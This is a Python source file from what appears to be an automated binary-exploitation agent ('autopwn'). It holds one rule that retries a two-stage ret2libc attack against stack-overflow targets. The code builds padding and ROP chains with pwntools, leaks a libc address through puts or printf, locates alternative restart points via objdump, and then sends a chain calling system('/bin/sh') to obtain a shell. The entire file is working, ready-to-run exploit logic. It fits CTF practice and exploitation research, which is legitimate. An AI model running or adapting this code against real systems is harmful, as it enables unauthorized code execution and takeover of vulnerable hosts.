"""Rule: fix ret2libc when stage1 leak succeeds but restart fails.

Tries alternative restart targets: vulnerable function entry, read/gets
call site, or one_gadget to avoid restart entirely.
"""
from __future__ import annotations

import re
import subprocess
import time

from pwn import log, flat, p64, p32, u64, u32

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, verify_shell, interactive_or_close, safe_close


def _condition(state) -> bool:
    ctx = state.ctx
    # Applicable when:
    # 1. overflow_offset is known
    # 2. ret2libc was tried (in phase5 strategies) but failed
    # 3. We have puts/printf in PLT and pop rdi gadget
    if ctx.overflow_offset < 0:
        return False
    if "ret2libc" not in state.phase5_strategies_tried:
        return False
    if ctx.bits == 64 and not ctx.find_gadget("pop rdi"):
        return False
    has_leak = any(f in (ctx.plt_table or {}) for f in ("puts", "printf"))
    return has_leak


def _action(state) -> ActionResult:
    """Try alternative restart strategies for ret2libc."""
    ctx = state.ctx
    word = ctx.bits // 8
    pop_rdi = ctx.find_gadget("pop rdi")
    ret = ctx.find_gadget("ret")
    offset = ctx.overflow_offset

    # Find leak function
    leak_func = "puts" if "puts" in ctx.plt_table else "printf"
    leak_plt = ctx.plt_table[leak_func]

    # Find GOT entry
    got_target = ""
    got_addr = 0
    for name in (leak_func, "puts", "printf", "__libc_start_main", "setvbuf", "read"):
        if name in ctx.got_table:
            got_target = name
            got_addr = ctx.got_table[name]
            break

    if not got_addr:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="restart_fix", diagnosis="no_got"))

    # Collect alternative restart addresses
    restart_candidates = _find_restart_candidates(ctx)
    if not restart_candidates:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="restart_fix", diagnosis="no_restart_targets"))

    for restart_name, restart_addr in restart_candidates:
        for use_align in ([True, False] if ret else [False]):
            io = None
            try:
                io = open_target(ctx)
                try:
                    io.recv(timeout=1)
                except Exception:
                    pass

                # Build stage1 leak chain
                if ctx.bits == 64:
                    if use_align:
                        chain1 = [pop_rdi, got_addr, ret, leak_plt, restart_addr]
                    else:
                        chain1 = [pop_rdi, got_addr, leak_plt, restart_addr]
                else:
                    chain1 = [leak_plt, restart_addr, got_addr]

                pad = b"A" * offset
                payload1 = pad + flat(chain1)

                label = f"{restart_name}@{restart_addr:#x}" + ("+align" if use_align else "")
                log.info(f"Agent restart_fix: stage1 leak via {leak_func}, "
                         f"restart to {label}")

                # Send payload - check if input needs newline
                needs_nl = ctx.input_type in ("gets", "direct")
                if needs_nl:
                    io.sendline(payload1)
                else:
                    io.send(payload1)

                # Parse leak
                leaked = _recv_leak(io, leak_func, ctx.bits)
                if not leaked:
                    safe_close(io)
                    continue

                log.success(f"Agent restart_fix: leaked {got_target} = {leaked:#x}")

                # Resolve libc
                from autopwn.agent.rules.sleep_bypass import _resolve_local_libc
                libc = ctx.libc or _resolve_local_libc(ctx, got_target, leaked)
                if not libc:
                    # Update base if libc already loaded
                    safe_close(io)
                    continue

                system_addr = libc.symbols.get("system", 0)
                bin_sh = 0
                try:
                    bin_sh = next(libc.search(b"/bin/sh\x00"))
                except StopIteration:
                    pass

                if not system_addr or not bin_sh:
                    safe_close(io)
                    continue

                # Drain restart prompt
                try:
                    io.recv(timeout=1.5)
                except Exception:
                    pass

                # Stage 2: system("/bin/sh")
                for s2_align in ([True, False] if ret else [False]):
                    try:
                        if ctx.bits == 64:
                            if s2_align:
                                chain2 = [ret, pop_rdi, bin_sh, system_addr]
                            else:
                                chain2 = [pop_rdi, bin_sh, system_addr]
                        else:
                            chain2 = [system_addr, 0xDEADBEEF, bin_sh]

                        payload2 = pad + flat(chain2)
                        s2_label = "align" if s2_align else "direct"
                        log.info(f"Agent restart_fix: stage2 system('/bin/sh') ({s2_label})")

                        if needs_nl:
                            io.sendline(payload2)
                        else:
                            io.send(payload2)

                        if verify_shell(io):
                            return ActionResult(
                                success=interactive_or_close(io, True),
                                record=AttemptRecord(strategy="restart_fix", success=True),
                            )
                    except Exception:
                        pass

                    # For next alignment variant, need to re-run stage1
                    safe_close(io)
                    io = open_target(ctx)
                    try:
                        io.recv(timeout=1)
                    except Exception:
                        pass
                    if needs_nl:
                        io.sendline(payload1)
                    else:
                        io.send(payload1)
                    new_leaked = _recv_leak(io, leak_func, ctx.bits)
                    if new_leaked and _is_plausible(new_leaked, ctx.bits):
                        raw_off = libc.symbols.get(got_target, 0) - libc.address
                        if raw_off > 0:
                            new_base = new_leaked - raw_off
                            if new_base & 0xfff == 0:
                                libc.address = new_base
                                system_addr = libc.symbols.get("system", 0)
                                try:
                                    bin_sh = next(libc.search(b"/bin/sh\x00"))
                                except StopIteration:
                                    bin_sh = 0
                    try:
                        io.recv(timeout=1.5)
                    except Exception:
                        pass

                safe_close(io)
                io = None

            except Exception as exc:
                log.debug(f"restart_fix error: {exc}")
                if io:
                    safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="restart_fix", diagnosis="all_restarts_failed"),
    )


def _find_restart_candidates(ctx) -> list[tuple[str, int]]:
    """Find alternative restart targets beyond main/_start."""
    candidates: list[tuple[str, int]] = []
    elf = ctx.elf
    if not elf:
        return candidates

    # 1. Find the vulnerable function (by scanning for dangerous calls)
    try:
        result = subprocess.run(
            ["objdump", "-d", ctx.binary_path],
            capture_output=True, text=True, timeout=10,
        )
        disasm = result.stdout
    except Exception:
        disasm = ""

    # Find function containing gets/read (the vuln function)
    func_name = ""
    func_addr = 0
    current_func = ""
    current_addr = 0
    for line in disasm.splitlines():
        m = re.match(r'([0-9a-f]+) <(\w+)>:', line)
        if m:
            current_addr = int(m.group(1), 16)
            current_func = m.group(2)
            continue
        if current_func and current_func not in ("main", "_start", "__libc_csu_init"):
            if 'call' in line and any(f in line for f in ['gets', '<read>']):
                func_name = current_func
                func_addr = current_addr

    if func_name and func_addr:
        candidates.append((func_name, func_addr))

    # 2. Find the call-site of the vuln function in main (after the call instruction)
    # This skips main's initialization and goes straight to the read point
    if func_name:
        in_main = False
        for line in disasm.splitlines():
            if re.match(r'[0-9a-f]+ <main>:', line):
                in_main = True
                continue
            if in_main:
                if re.match(r'[0-9a-f]+ <\w+>:', line):
                    break
                # Find call to vuln function
                if f'<{func_name}>' in line and 'call' in line:
                    m = re.match(r'\s*([0-9a-f]+):', line)
                    if m:
                        call_addr = int(m.group(1), 16)
                        candidates.append((f"call_{func_name}", call_addr))

    # 3. Standard: main, _start
    for name in ("main", "_start"):
        if name in elf.symbols:
            candidates.append((name, elf.symbols[name]))

    return candidates


def _recv_leak(io, leak_func: str, bits: int) -> int:
    """Receive and parse leaked address."""
    try:
        for _ in range(4):
            try:
                data = io.recvline(timeout=2)
            except Exception:
                break
            data = data.strip(b"\n")
            if not data:
                continue
            if bits == 64:
                data = data.ljust(8, b"\x00")[:8]
                addr = u64(data)
                if _is_plausible(addr, bits):
                    return addr
            else:
                data = data.ljust(4, b"\x00")[:4]
                addr = u32(data)
                if _is_plausible(addr, bits):
                    return addr
    except Exception:
        pass
    return 0


def _is_plausible(addr: int, bits: int) -> bool:
    if addr == 0:
        return False
    if bits == 64:
        return 0x7e0000000000 <= addr <= 0x7fffffffffff
    return 0xf7000000 <= addr <= 0xf7ffffff


RULES = [
    ("restart_fix", 90, "fix ret2libc when leak works but restart fails",
     _condition, _action),
]
